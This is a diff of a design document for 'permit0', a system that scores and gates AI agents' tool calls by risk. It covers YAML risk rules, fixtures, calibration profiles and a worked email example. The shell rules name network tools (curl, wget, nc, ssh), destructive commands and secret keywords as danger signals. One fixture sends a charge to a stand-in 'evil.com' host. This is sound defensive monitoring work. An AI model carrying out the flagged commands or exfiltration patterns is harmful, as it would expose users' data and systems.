-                "session":          5,
-                "actor":            5,
-                "scope":            8,
-                "volume":           5,
-                "amount":           0,
-            },
-        )
+```yaml
+# packs/stripe/fixtures/charges.create.fixtures.yaml
+- name: basic usd charge
+  input:
+    tool: http
+    arguments:
+      method: POST
+      url: https://api.stripe.com/v1/charges
+      body: { amount: 5000, currency: usd, customer: cus_123 }
+  ctx:
+    org_stripe_account_id: acct_123
+  expect:
+    action_type: payments.charge
+    entities:
+      amount: 5000
+      currency: usd
+      destination_scope: internal
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        path    = fields.get("path", "").lower()
-        content = fields.get("content", "").lower()
-        mode    = fields.get("mode", "write")
-
-        if any(path.startswith(sp) for sp in FilesWrite.SYSTEM_PATHS):
-            t.add("PRIVILEGE")
-            t.upgrade("scope", 20)
-            t.upgrade("irreversibility", 8)
-
-        if mode in ("delete", "overwrite"):
-            t.add("DESTRUCTION", "secondary")
-            t.upgrade("irreversibility", 8)
-
-        if _contains_any(content, FilesWrite.SENSITIVE_KEYS):
-            t.add("EXPOSURE")
-            t.upgrade("sensitivity", 18)
-
-        _env_mutations(fields, t)
+- name: wrong host does not match
+  input:
+    tool: http
+    arguments:
+      method: POST
+      url: https://api.evil.com/v1/charges
+      body: { amount: 100 }
+  expect:
+    matched: false
 ```
 
-### network.http_post
+### Contribution Model
 
-```python
-@register("network.http_post")
-class NetworkHttpPost:
+- **First-party packs** (Rust crates under `packs/`) are maintained by the core team.
+- **Community packs** (YAML under `pack-bundles/`) are contributed by anyone. They follow a staged trust model: `community/` → `verified/` after review and sustained deployment.
+- A contributor who has never seen permit0 should be able to copy an existing pack, modify it, run `permit0 pack test`, and submit a PR **in under 30 minutes**.
+- **Packs never depend on vendor SDKs.** They parse the *shape* of tool calls, not live API responses. If enrichment is needed (e.g., "is this Slack channel public?"), the host pre-enriches the raw call before permit0 sees it.
 
-    INTERNAL_HOSTS  = {"localhost", "127.0.0.1", "0.0.0.0", ".internal.", ".corp."}
-    SENSITIVE_KEYS  = {"password", "secret", "token", "api_key", "private"}
-    FINANCIAL_TERMS = {"payment", "charge", "invoice", "stripe", "wire", "transfer"}
+---
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={"OUTBOUND": "primary"},
-            amplifiers={
-                "irreversibility":  6,
-                "boundary":        14,
-                "destination":     18,
-                "sensitivity":      8,
-                "environment":     10,
-                "session":          8,
-                "actor":            5,
-                "scope":            5,
-                "volume":           5,
-                "amount":           0,
-            },
-        )
+## 7. Risk Rules
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        method  = fields.get("method", "POST").upper()
-        url     = fields.get("url", "").lower()
-        body    = fields.get("body", "")
-        headers = fields.get("headers", {})
+Risk rules define how each `action_type` is scored. They are YAML files that declare the base risk template (flags + amplifiers) and entity-driven mutation rules.
 
-        header_str = " ".join(f"{k} {v}" for k, v in headers.items()).lower()
-        body_lower = body.lower() if isinstance(body, str) else ""
+The full DSL specification is in [docs/dsl.md](dsl.md). This section shows the architecture and reference implementations.
 
-        if any(h in url for h in NetworkHttpPost.INTERNAL_HOSTS):
-            t.downgrade("destination", 10)
-            t.downgrade("boundary", 6)
-        else:
-            t.upgrade("destination", 10)
+### Risk Rule Structure
 
-        if method in ("POST", "PUT", "PATCH"):
-            t.add("MUTATION")
-            t.upgrade("irreversibility", 6)
-        elif method == "DELETE":
-            t.add("DESTRUCTION", "secondary")
-            t.upgrade("irreversibility", 10)
+A risk rule has three parts:
 
-        if _contains_any(body_lower + header_str, NetworkHttpPost.SENSITIVE_KEYS):
-            t.add("EXPOSURE")
-            t.upgrade("sensitivity", 18)
+1. **`base`** — the structural minimum risk template (flags + amplifiers that are always true for this action type).
+2. **`rules`** — ordered list of entity-driven mutations (if X then add flag / adjust amplifier).
+3. **`session_rules`** — optional session-aware mutations (if session history shows Y then adjust).
 
-        if _contains_any(body_lower + url, NetworkHttpPost.FINANCIAL_TERMS):
-            t.add("FINANCIAL")
-            t.upgrade("amount", 20)
-            t.upgrade("irreversibility", 6)
+### Example: email.send
 
-        _env_mutations(fields, t)
+```yaml
+# packs/gmail/risk-rules/email.send.risk.yaml
+permit0_pack: v1
+action_type: email.send
+
+base:
+  flags:
+    OUTBOUND: primary       # every send crosses a boundary
+    EXPOSURE: primary       # surfaces sender identity and content
+    MUTATION: secondary     # leaves a record (sent folder, logs)
+  amplifiers:
+    irreversibility: 16     # cannot be recalled once sent
+    boundary:        12     # crosses at least one trust boundary
+    destination:     20     # unknown until recipient is seen
+    sensitivity:     10     # unknown until content is seen
+    environment:     10     # assumed production until stated
+    session:          8
+    actor:            5
+    scope:            5
+    volume:           3
+    amount:           0
+
+rules:
+  # ── Recipient scope ──────────────────────────────────────────
+  - when:
+      entity.recipient_scope: self
+    then:
+      - remove_flag: EXPOSURE
+      - downgrade: { dim: boundary, delta: 10 }
+      - downgrade: { dim: destination, delta: 12 }
+
+  - when:
+      entity.recipient_scope: internal
+    then:
+      - downgrade: { dim: destination, delta: 12 }
+      - downgrade: { dim: boundary, delta: 6 }
+
+  - when:
+      entity.recipient_scope: external
+    then:
+      - upgrade: { dim: destination, delta: 14 }
+
+  # ── Reply context ────────────────────────────────────────────
+  - when:
+      entity.in_reply_to:
+        exists: true
+    then:
+      - downgrade: { dim: boundary, delta: 5 }
+
+  # ── Attachments ──────────────────────────────────────────────
+  - when:
+      entity.attachments:
+        not_empty: true
+    then:
+      - upgrade: { dim: sensitivity, delta: 12 }
+
+  - when:
+      entity.attachments:
+        any_match:
+          field: classification
+          value: [confidential, secret]
+    then:
+      - gate: "Classified attachment to external or unknown recipient"
+
+  # ── Body / subject content ───────────────────────────────────
+  - when:
+      entity.body:
+        contains_any: [invoice, wire, payment, "account number", "routing number"]
+    then:
+      - add_flag: { flag: FINANCIAL, role: primary }
+      - upgrade: { dim: amount, delta: 18 }
+
+  - when:
+      entity.body:
+        contains_any: [password, secret, "api key", token, "private key"]
+    then:
+      - upgrade: { dim: sensitivity, delta: 20 }
+      - promote_flag: EXPOSURE
+
+  # ── Recipient count ──────────────────────────────────────────
+  - when:
+      entity.recipient_count: { gte: 50 }
+    then:
+      - upgrade: { dim: scope, delta: 25 }
+      - add_flag: { flag: GOVERNANCE, role: secondary }
+
+  - when:
+      entity.recipient_count: { gte: 10, lt: 50 }
+    then:
+      - upgrade: { dim: scope, delta: 12 }
+
+  # ── Send rate ────────────────────────────────────────────────
+  - when:
+      entity.send_rate_per_minute: { gt: 10 }
+    then:
+      - upgrade: { dim: volume, delta: 18 }
+      - add_flag: { flag: EXECUTION, role: secondary }
+
+  # ── Forward leakage (split) ─────────────────────────────────
+  - when:
+      all:
+        - entity.is_forward: true
+        - entity.original_sender_domain: { equals_ctx: org_domain }
+        - entity.recipient_scope: external
+    then:
+      - split:
+          flags:
+            EXPOSURE: primary
+            OUTBOUND: primary
+          amplifiers:
+            destination: 40
+            sensitivity: 25
+            irreversibility: 20
+
+  # ── Environment ──────────────────────────────────────────────
+  - when:
+      entity.environment: production
+    then:
+      - override: { dim: environment, value: 15 }
+
+  - when:
+      entity.environment: { in: [test, staging, dev] }
+    then:
+      - override: { dim: environment, value: 3 }
+
+# ── Session-aware rules ──────────────────────────────────────
+session_rules:
+  - when:
+      session.rate_per_minute:
+        action_type: email.send
+        gte: 20
+    then:
+      - gate: "Email send rate exceeds 20/min — possible exfiltration"
+
+  - when:
+      session.rate_per_minute:
+        action_type: email.send
+        gte: 5
+    then:
+      - upgrade: { dim: volume, delta: 15 }
+      - add_flag: { flag: GOVERNANCE, role: secondary }
+
+  - when:
+      session.preceded_by:
+        action_types: [files.read, db.select]
+        within: 5
+    then:
+      - upgrade: { dim: sensitivity, delta: 12 }
+      - upgrade: { dim: destination, delta: 8 }
+
+  - when:
+      session.max_tier: { gte: HIGH }
+    then:
+      - upgrade: { dim: boundary, delta: 6 }
+      - upgrade: { dim: scope, delta: 6 }
 ```
 
-### db.delete
+### Example: process.shell
 
-```python
-@register("db.delete")
-class DbDelete:
+```yaml
+# packs/bash/risk-rules/process.shell.risk.yaml
+permit0_pack: v1
+action_type: process.shell
 
-    SENSITIVE_TABLES = {"users", "payments", "credentials", "secrets", "tokens", "sessions"}
+base:
+  flags:
+    EXECUTION: primary     # arbitrary shell logic always runs
+    MUTATION:  primary     # filesystem or process state may change
+  amplifiers:
+    irreversibility: 10
+    boundary:         8
+    destination:      5
+    sensitivity:      8
+    environment:     10
+    session:         10
+    actor:            8
+    scope:           10
+    volume:           5
+    amount:           0
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={"MUTATION": "primary"},
-            amplifiers={
-                "irreversibility": 10,
-                "boundary":         6,
-                "destination":      6,
-                "sensitivity":     14,   # databases often hold sensitive data
-                "environment":     10,
-                "session":          8,
-                "actor":            5,
-                "scope":           12,   # queries can touch many rows
-                "volume":           5,
-                "amount":           0,
-            },
-        )
+rules:
+  - when:
+      entity.command:
+        contains_any: ["rm -rf", "drop table", shred, mkfs, truncate]
+    then:
+      - add_flag: { flag: DESTRUCTION, role: primary }
+      - upgrade: { dim: irreversibility, delta: 10 }
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        verb      = fields.get("verb", "delete").lower()
-        table     = fields.get("table", "").lower()
-        query     = fields.get("query", "").upper()
-        row_count = fields.get("estimated_row_count", 0)
+  - when:
+      entity.command:
+        contains_any: [curl, wget, scp, rsync, " nc ", ncat, "ssh "]
+    then:
+      - add_flag: { flag: OUTBOUND, role: primary }
+      - upgrade: { dim: destination, delta: 15 }
+      - upgrade: { dim: boundary, delta: 8 }
 
-        # Hard stop for schema-level destruction
-        if "DROP" in query or "TRUNCATE" in query:
-            t.gate("DROP or TRUNCATE on database table")
-            return
+  - when:
+      entity.command:
+        contains_any: [sudo, "su ", "chmod 777", "chown root", setuid]
+    then:
+      - add_flag: { flag: PRIVILEGE, role: primary }
+      - upgrade: { dim: scope, delta: 15 }
+      - upgrade: { dim: actor, delta: 10 }
 
-        if verb in ("delete", "admin", "drop", "truncate"):
-            t.add("DESTRUCTION")
-            t.upgrade("irreversibility", 12)
+  - when:
+      entity.command:
+        contains_any: [password, secret, token, private_key, credentials]
+    then:
+      - add_flag: { flag: EXPOSURE, role: primary }
+      - upgrade: { dim: sensitivity, delta: 20 }
 
-        if verb == "export":
-            t.add("OUTBOUND")
-            t.upgrade("destination", 18)
-            t.upgrade("sensitivity", 10)
-            t.add("EXPOSURE", "secondary")
+  - when:
+      entity.command:
+        contains_any: [stripe, payment, invoice, wire, transfer]
+    then:
+      - add_flag: { flag: FINANCIAL, role: primary }
+      - upgrade: { dim: amount, delta: 15 }
 
-        if table in DbDelete.SENSITIVE_TABLES:
-            if "EXPOSURE" in t.flags:
-                t.promote("EXPOSURE")
-            else:
-                t.add("EXPOSURE")
-            t.upgrade("sensitivity", 18)
+  - when:
+      entity.pipe_count: { gte: 3 }
+    then:
+      - upgrade: { dim: scope, delta: 8 }
+      - upgrade: { dim: irreversibility, delta: 4 }
 
-        if row_count > 10_000:
-            t.upgrade("scope", 20)
-        elif row_count > 1_000:
-            t.upgrade("scope", 10)
+  - when:
+      entity.environment: production
+    then:
+      - override: { dim: environment, value: 15 }
+      - upgrade: { dim: scope, delta: 8 }
 
-        _env_mutations(fields, t)
+  - when:
+      entity.environment: { in: [test, staging, dev] }
+    then:
+      - override: { dim: environment, value: 3 }
+
+session_rules:
+  - when:
+      session.preceded_by:
+        action_types: [iam.assign_role]
+        within: 3
+    then:
+      - upgrade: { dim: scope, delta: 15 }
+      - upgrade: { dim: actor, delta: 10 }
+      - add_flag: { flag: PRIVILEGE, role: primary }
+
+  - when:
+      session.flag_sequence:
+        last_n: 4
+        contains: EXPOSURE
+    then:
+      - upgrade: { dim: destination, delta: 10 }
+      - upgrade: { dim: sensitivity, delta: 8 }
 ```
 
-### payments.charge
+### Example: payments.charge
 
-```python
-@register("payments.charge")
-class PaymentsCharge:
+```yaml
+# packs/stripe/risk-rules/payments.charge.risk.yaml
+permit0_pack: v1
+action_type: payments.charge
 
-    APPROVED_PAYEES: set[str] = set()   # populate from DB at startup
+base:
+  flags:
+    FINANCIAL: primary
+    MUTATION:  primary
+    OUTBOUND:  secondary    # money leaves the account
+  amplifiers:
+    irreversibility: 18     # financial txns are hard to reverse
+    boundary:        16     # crosses financial system boundary
+    destination:     22     # external payment endpoint
+    amount:          20     # unknown until amount is known
+    sensitivity:     12
+    environment:     12
+    session:         10
+    actor:           10
+    scope:            5
+    volume:           5
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={
-                "FINANCIAL": "primary",
-                "MUTATION":  "primary",
-                "OUTBOUND":  "secondary",  # money leaves the account
-            },
-            amplifiers={
-                "irreversibility": 18,   # financial txns are hard to reverse
-                "boundary":        16,   # crosses financial system boundary
-                "destination":     22,   # external payment endpoint
-                "amount":          20,   # unknown until amount is known
-                "sensitivity":     12,
-                "environment":     12,
-                "session":         10,
-                "actor":           10,
-                "scope":            5,
-                "volume":           5,
-            },
-        )
+rules:
+  - when:
+      entity.amount: { gt: 100000 }
+    then:
+      - gate: "Large financial transaction exceeds autonomous limit"
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        amount    = fields.get("amount", 0)
-        verb      = fields.get("verb", "charge")
-        recipient = fields.get("recipient", "")
+  - when:
+      entity.amount: { gt: 10000 }
+    then:
+      - upgrade: { dim: amount, delta: 10 }
+      - upgrade: { dim: scope, delta: 8 }
 
-        if amount > 100_000:
-            t.gate("Large financial transaction exceeds autonomous limit")
-            return
+  - when:
+      entity.recipient:
+        not_in_set: approved_payees
+    then:
+      - upgrade: { dim: destination, delta: 14 }
+      - upgrade: { dim: boundary, delta: 8 }
 
-        if amount > 10_000:
-            t.upgrade("amount", 10)
-            t.upgrade("scope", 8)
+  - when:
+      all:
+        - entity.verb: transfer
+        - entity.destination_is_external: true
+    then:
+      - upgrade: { dim: destination, delta: 16 }
+      - add_flag: { flag: GOVERNANCE, role: secondary }
 
-        if recipient and recipient not in PaymentsCharge.APPROVED_PAYEES:
-            t.upgrade("destination", 14)
-            t.upgrade("boundary", 8)
+  - when:
+      entity.environment: production
+    then:
+      - override: { dim: environment, value: 15 }
 
-        if verb == "transfer" and fields.get("destination_is_external", True):
-            t.upgrade("destination", 16)
-            t.add("GOVERNANCE", "secondary")
-
-        _env_mutations(fields, t)
+  - when:
+      entity.environment: { in: [test, staging, dev] }
+    then:
+      - override: { dim: environment, value: 3 }
 ```
 
-### iam.assign_role
+### Risk Rule Execution
 
-```python
-@register("iam.assign_role")
-class IamAssignRole:
+The Rust DSL interpreter executes risk rules in this order:
 
-    ADMIN_ROLES = {"admin", "owner", "superuser", "root", "administrator"}
+1. Construct a `RiskTemplate` from the `base` section.
+2. Evaluate each rule in `rules` top-to-bottom. If `when` matches the entity values, apply the `then` mutations. A `gate` halts evaluation immediately.
+3. If a `SessionContext` is present, evaluate `session_rules` top-to-bottom.
+4. Pass the completed `RiskTemplate` to `compute_hybrid()`.
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={
-                "PRIVILEGE":   "primary",
-                "GOVERNANCE":  "secondary",  # changing who can do what is a rule change
-            },
-            amplifiers={
-                "irreversibility": 12,
-                "boundary":        14,
-                "destination":      8,
-                "sensitivity":     10,
-                "environment":     12,
-                "session":         12,
-                "actor":           14,
-                "scope":           14,
-                "volume":           3,
-                "amount":           0,
-            },
-        )
-
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        role        = fields.get("role", "").lower()
-        verb        = fields.get("verb", "assign_role")
-        target_type = fields.get("target_type", "user")  # user | service_account | external
-
-        if role in IamAssignRole.ADMIN_ROLES:
-            t.upgrade("scope", 20)
-            t.upgrade("irreversibility", 8)
-            t.promote("GOVERNANCE")
-
-        if target_type in ("service_account", "external"):
-            t.upgrade("boundary", 8)
-            t.upgrade("destination", 10)
-
-        if verb == "generate_api_key":
-            t.add("EXECUTION", "secondary")
-            t.upgrade("session", 14)   # API keys persist beyond the session
-
-        if fields.get("environment") == "production":
-            t.override("environment", 15)
-            t.upgrade("scope", 6)
-        elif fields.get("environment") in ("test", "staging", "dev"):
-            t.override("environment", 3)
-```
-
-### secrets.read
-
-```python
-@register("secrets.read")
-class SecretsRead:
-
-    HIGH_RISK_TYPES = {"api_key", "private_key", "certificate", "signing_key"}
-
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={
-                "EXPOSURE":  "primary",    # reading a secret surfaces it
-                "EXECUTION": "secondary",  # access is a programmatic privilege
-            },
-            amplifiers={
-                "irreversibility":  8,
-                "boundary":        12,
-                "destination":     10,
-                "sensitivity":     30,    # secrets are by definition highly sensitive
-                "environment":     10,
-                "session":         14,    # secrets in session persist in memory
-                "actor":            8,
-                "scope":            8,
-                "volume":           5,
-                "amount":           0,
-            },
-        )
-
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        verb        = fields.get("verb", "read")
-        secret_type = fields.get("secret_type", "")
-        dest_proc   = fields.get("destination_process", "")
-        is_external = fields.get("destination_is_external", False)
-
-        if verb == "read" and secret_type in SecretsRead.HIGH_RISK_TYPES:
-            t.upgrade("sensitivity", 5)
-            t.upgrade("scope", 8)
-
-        if verb in ("create", "rotate"):
-            t.add("MUTATION")
-            t.upgrade("irreversibility", 8)
-
-        if is_external or (dest_proc and "external" in dest_proc.lower()):
-            t.add("OUTBOUND")
-            t.upgrade("destination", 16)
-            t.upgrade("boundary", 8)
-
-        _env_mutations(fields, t)
-```
+Rules are evaluated in declaration order. This is intentional — authors control precedence by ordering. A `gate` rule placed early can short-circuit all subsequent rules.
 
 ### Adding a New Action Type — Checklist
 
-```python
-# Checklist (enforce in code review):
-# □ action_type uses domain.verb format
-# □ base() includes only structurally-always-true flags
-# □ base() amplifiers set to reasonable defaults — not all zeros
-# □ mutate() covers all meaningful entity field values
-# □ gate() is always followed by return
-# □ split() used only for independent sub-risk events
-# □ _env_mutations() called at the end of mutate()
-# □ Five calibration assertions written and passing
-
-def _calibration_assertions(action_type: str, cases: list[tuple[dict, Tier]]) -> None:
-    """Run calibration assertions for a new action type."""
-    for fields, expected_tier in cases:
-        result = assess(action_type, fields)
-        assert result.tier <= expected_tier, (
-            f"CALIBRATION FAIL: {action_type} "
-            f"fields={fields} → tier={result.tier.name} "
-            f"expected ≤ {expected_tier.name}"
-        )
-```
+1. `action_type` uses `domain.verb` format from the catalog
+2. `base.flags` include only structurally-always-true flags
+3. `base.amplifiers` set to reasonable defaults — not all zeros
+4. `rules` cover all meaningful entity field values
+5. `gate` rules come before the mutations they protect
+6. `split` used only for independent sub-risk events
+7. Environment rules included at the end
+8. Five calibration fixtures written and passing
+9. Session rules cover known dangerous patterns for this action type
 
 ---
 
-## 7. Worked Example
+## 8. Calibration System
+
+The calibration system is a three-layer architecture that allows safe customisation of risk scoring without compromising the safety model.
+
+### Layer 1: Base Engine (Rust, compiled)
+
+The weights, thresholds, and immutable block rules from §5 are compiled into Rust. They are the source of truth when no configuration exists.
+
+The base engine also defines **guardrails** — absolute bounds no configuration layer can escape:
+
+```rust
+pub struct Guardrails {
+    /// No flag weight can be adjusted below this fraction of its base (default: 0.5).
+    pub min_weight_ratio: f64,
+    /// No flag weight can be adjusted above this fraction of its base (default: 2.0).
+    pub max_weight_ratio: f64,
+    /// Tier thresholds cannot shift more than this (default: 0.10).
+    pub max_threshold_shift: f64,
+    /// Block rules can only be made stricter, never weaker.
+    pub block_rules_direction: Direction,  // OnlyStricter
+    /// The tanh constant range (default: 1.0–2.5).
+    pub tanh_k_range: (f64, f64),
+    /// Flags that can NEVER be removed or zeroed (DESTRUCTION, PHYSICAL, EXECUTION).
+    pub immutable_flags: Vec<String>,
+    /// Block rules that can NEVER be disabled.
+    pub immutable_block_rules: Vec<String>,
+    /// Minimum tier floor per domain.
+    pub min_tier_by_domain: HashMap<String, Tier>,
+}
+```
+
+Guardrails are **compiled into the engine**. No YAML file can disable them.
+
+### Layer 2: Domain Profiles (shipped presets)
+
+Curated configurations for specific industries. Customers choose one as their starting point.
+
+```yaml
+# profiles/fintech.profile.yaml
+permit0_profile: v1
+id: fintech
+name: Financial Services
+description: >
+  Conservative defaults for PCI-DSS and SOX regulated environments.
+version: "2025.1"
+
+risk_weight_adjustments:
+  FINANCIAL:    1.5     # 0.20 × 1.5 = 0.30
+  EXPOSURE:     1.3
+  OUTBOUND:     1.2
+  MUTATION:     0.8
+
+amp_weight_adjustments:
+  amount:       1.4
+  destination:  1.3
+  sensitivity:  1.1
+  actor:        0.7
+
+tier_threshold_shifts:
+  MEDIUM:  -0.05        # 0.55 → 0.50
+  HIGH:    -0.05        # 0.75 → 0.70
+
+additional_block_rules:
+  - name: large_external_transfer
+    condition:
+      flags: [FINANCIAL, OUTBOUND]
+      amplifiers:
+        amount: ">= 0.70"
+        destination: ">= 0.60"
+    reason: "Large financial transfer to external destination"
+
+action_type_floors:
+  payments.charge:      LOW
+  payments.transfer:    MEDIUM
+  iam.assign_role:      HIGH
+  iam.generate_api_key: HIGH
+  secrets.read:         MEDIUM
+```
+
+```yaml
+# profiles/healthtech.profile.yaml
+permit0_profile: v1
+id: healthtech
+name: Healthcare & Life Sciences
+description: >
+  HIPAA-aligned defaults. Aggressive on data exposure and
+  external communication involving potential PHI.
+version: "2025.1"
+
+risk_weight_adjustments:
+  EXPOSURE:     1.8     # PHI exposure is the primary threat
+  OUTBOUND:     1.5
+  FINANCIAL:    0.9
+  PHYSICAL:     1.4
+
+amp_weight_adjustments:
+  sensitivity:  1.6
+  destination:  1.4
+  boundary:     1.3
+  amount:       0.6
+
+tier_threshold_shifts:
+  MEDIUM:  -0.08
+  HIGH:    -0.07
+
+additional_block_rules:
+  - name: phi_external_send
+    condition:
+      flags: [OUTBOUND, EXPOSURE]
+      amplifiers:
+        sensitivity: ">= 0.60"
+        destination: ">= 0.50"
+    reason: "Potential PHI sent to external destination"
+
+  - name: bulk_patient_export
+    condition:
+      flags: [EXPOSURE]
+      amplifiers:
+        volume: ">= 0.80"
+        sensitivity: ">= 0.50"
+    reason: "Bulk export of sensitive records"
+
+action_type_floors:
+  email.send:     MEDIUM
+  email.forward:  HIGH
+  files.export:   HIGH
+  files.share:    HIGH
+  db.export:      HIGH
+  db.select:      LOW
+```
+
+What domain profiles **can** do: adjust weights (0.5×–2.0×), shift thresholds (±0.10), add block rules, set action-type floor tiers (only raise).
+
+What they **cannot** do: remove/zero a flag, disable a base block rule, lower a floor, change the scoring algorithm.
+
+### Layer 3: Org Policy (per-customer)
+
+```yaml
+# config/org-policy.yaml
+permit0_org_policy: v1
+org_id: acme-treasury
+base_profile: fintech
+
+risk_weight_adjustments:
+  FINANCIAL: 1.2
+
+tier_threshold_shifts:
+  HIGH: +0.03
+
+action_type_amplifier_overrides:
+  payments.charge:
+    amount:
+      breakpoints:
+        - below: 50000       # under $500 — low
+          value: 5
+        - below: 5000000     # under $50k — moderate
+          value: 15
+        - below: 50000000    # under $500k — high
+          value: 25
+        - above: 50000000    # over $500k — max
+          value: 30
+
+  payments.transfer:
+    destination:
+      known_safe_values:
+        - "acct_correspondent_bank_a"
+        - "acct_correspondent_bank_b"
+      when_safe: 5
+      when_unknown: 35
+
+allowlist:
+  - norm_hash: "a3f91b2c7d4e8012"
+    reason: "Daily reconciliation report to internal finance team"
+    approved_by: "jane@acme.com"
+    approved_at: "2025-03-15"
+    expires: "2025-09-15"
+    review_ticket: "SEC-1234"
+
+additional_block_rules:
+  - name: weekend_large_transfer
+    condition:
+      flags: [FINANCIAL, OUTBOUND]
+      amplifiers:
+        amount: ">= 0.50"
+      context:
+        day_of_week: [saturday, sunday]
+    reason: "Large transfers blocked outside business hours"
+```
+
+Org policies can additionally define **custom amplifier breakpoints** per action type and **known-safe values** that reduce amplifier scores for specific entity fields.
+
+### Layer Composition
+
+At engine startup, the three layers are resolved into a single `ScoringConfig`:
+
+```rust
+let config = ScoringConfig::from_layers(
+    &BaseConfig::default(),
+    Some(&Profile::load("fintech")?),
+    Some(&OrgPolicy::load("./org-policy.yaml")?),
+    &Guardrails::default(),
+)?;
+```
+
+`check_guardrails()` runs after each layer is applied and ensures cumulative effects stay within bounds. If any check fails, the **engine refuses to start** — not a warning, a hard failure.
+
+### Calibration Tooling
+
+```bash
+# Show what a profile/org-policy changes
+permit0 calibrate diff --profile fintech
+
+# Run a tool call through a specific config
+permit0 calibrate simulate --profile fintech --org-policy ./org-policy.yaml \
+  --input '{"tool":"stripe","arguments":{"method":"charges.create","amount":5000}}'
+
+# Run the golden calibration corpus
+permit0 calibrate test --profile fintech --corpus corpora/calibration/
+
+# Validate guardrails without starting the engine
+permit0 calibrate validate --profile fintech --org-policy ./org-policy.yaml
+```
+
+### What Calibrated Means
+
+The system is calibrated when:
+
+- A human reviewer, shown a tool call and its tier, agrees in >= 90% of cases
+- Tier distribution across production traffic roughly matches:
+  - MINIMAL / LOW: ~60% (routine reads, internal ops)
+  - MEDIUM: ~25% (sends, writes, external calls)
+  - HIGH: ~10% (sensitive data, financial, prod exec)
+  - CRITICAL: ~5% (should be rare — tune if higher)
+- Block rules fire on real violations, not benign actions
+
+### Calibration Cadence
+
+| Trigger | Action |
+|---|---|
+| New action type registered | Calibrate that type with >= 5 cases |
+| New risk class observed in prod | Review relevant block rules |
+| Human override rate > 15% | Full calibration pass |
+| Quarterly review | Full calibration pass |
+| Significant policy change | Re-derive tier thresholds |
+
+---
+
+## 9. Worked Example
 
 **Input: `bash` → gmail send**
 
-```python
-raw_action = {
-    "tool": "bash",
-    "arguments": {
-        "command": 'gog gmail send --to lan_huiying@outlook.com --subject "Hello" --body "Hello!"'
-    }
+```
+Raw tool call:
+{
+  "tool": "bash",
+  "arguments": {
+    "command": "gog gmail send --to alice@outlook.com --subject \"Hello\" --body \"Hello!\""
+  }
 }
-
-# Step 1: Normalize
-norm = normalize_action(raw_action, org_domain="myorg.com")
-# norm = {
-#   "action_type": "email.send",
-#   "domain": "email", "verb": "send", "channel": "gmail",
-#   "entities": {
-#     "recipient": "lan_huiying@outlook.com",
-#     "recipient_scope": "external",   ← outlook.com ≠ myorg.com
-#     "subject": "Hello",
-#     "has_body": True,
-#     "has_attachments": False,
-#     "body": "Hello!",
-#   }, ...
-# }
-
-# Step 2: Build fields for assess()
-fields = {
-    **norm["entities"],
-    "org_domain":           "myorg.com",
-    "environment":          "production",
-    "recipient_count":      1,
-    "send_rate_per_minute": 0,
-    "in_reply_to":          None,
-    "is_forward":           False,
-}
-
-# Step 3: Base template (EmailSend.base())
-# flags = {OUTBOUND: primary, EXPOSURE: primary, MUTATION: secondary}
-# amplifiers = {irreversibility:16, boundary:12, destination:20,
-#               sensitivity:10, environment:10, session:8,
-#               actor:5, scope:5, volume:3, amount:0}
-
-# Step 4: Mutations applied
-# recipient_scope == "external"  → upgrade(destination, 14)  → 20+14 = 34
-# no attachments                 → skip
-# body "Hello!" — no patterns   → skip
-# environment "production"       → override(environment, 15)
-
-# Step 5: Score
-result = assess("email.send", fields)
-
-# Scoring trace:
-#   norm: destination=34/40=0.85, boundary=12/20=0.60, irreversibility=16/20=0.80
-#   compound = (1 + 0.155×0.85) × (1 + 0.078×0.60) × (1 + 0.097×0.80)
-#            = 1.132 × 1.047 × 1.078 ≈ 1.277
-#   base (data category only): OUTBOUND+EXPOSURE+MUTATION fire → moderate
-#   tanh squeeze → raw ≈ 0.38
-
-print(f"raw={result.raw}  score={result.score}  tier={result.tier.name}")
-# → raw=0.38  score=38  tier=MEDIUM
-
-# MEDIUM routes to agent reviewer; final permission depends on reviewer verdict.
-# With a benign body and single recipient the reviewer approves:
-print(f"routing={score_to_routing(result.tier)}")
-# → routing=agent_review  (internal -- triggers handle_medium)
 ```
 
+**Step 1: Normalize** (gmail bash normalizer matches)
+
+```yaml
+NormAction:
+  action_type: email.send
+  domain: email
+  verb: send
+  channel: gmail
+  entities:
+    recipient: alice@outlook.com
+    recipient_scope: external      # outlook.com ≠ myorg.com
+    subject: Hello
+    has_body: true
+    has_attachments: false
+    body: "Hello!"
+  execution:
+    surface_tool: bash
+    surface_command: "gog gmail send --to alice@outlook.com ..."
+```
+
+**Step 2: Build risk template** from `email.send.risk.yaml` base:
+
+```
+flags = {OUTBOUND: primary, EXPOSURE: primary, MUTATION: secondary}
+amplifiers = {irreversibility:16, boundary:12, destination:20,
+              sensitivity:10, environment:10, session:8,
+              actor:5, scope:5, volume:3, amount:0}
+```
+
+**Step 3: Apply mutation rules** (top-to-bottom):
+
+```
+1. recipient_scope == "external" → upgrade(destination, 14) → 20+14 = 34
+2. no in_reply_to               → skip
+3. no attachments                → skip
+4. body "Hello!" — no financial patterns → skip
+5. body — no credential patterns → skip
+6. recipient_count < 10          → skip
+7. environment "production"      → override(environment, 15)
+```
+
+**Step 4: Score** via `compute_hybrid`:
+
+```
+norm: destination=34/40=0.85, boundary=12/20=0.60, irreversibility=16/20=0.80
+compound = (1 + 0.155×0.85) × (1 + 0.078×0.60) × (1 + 0.097×0.80)
+         = 1.132 × 1.047 × 1.078 ≈ 1.277
+base (data category): OUTBOUND+EXPOSURE+MUTATION fire → moderate
+tanh squeeze → raw ≈ 0.38
+```
+
+**Result:** `raw=0.38, score=38, tier=MEDIUM`
+
 **Why MEDIUM and not LOW?**
-- `destination` elevated to 34/40 (external recipient)
+- `destination` at 34/40 (external recipient)
 - `irreversibility` at 16/20 (email cannot be recalled)
 - `environment` at 15/15 (production confirmed)
-- These three multiply → pushes above LOW ceiling (raw 0.35)
+- These three multiply → pushes above LOW ceiling (0.35)
 
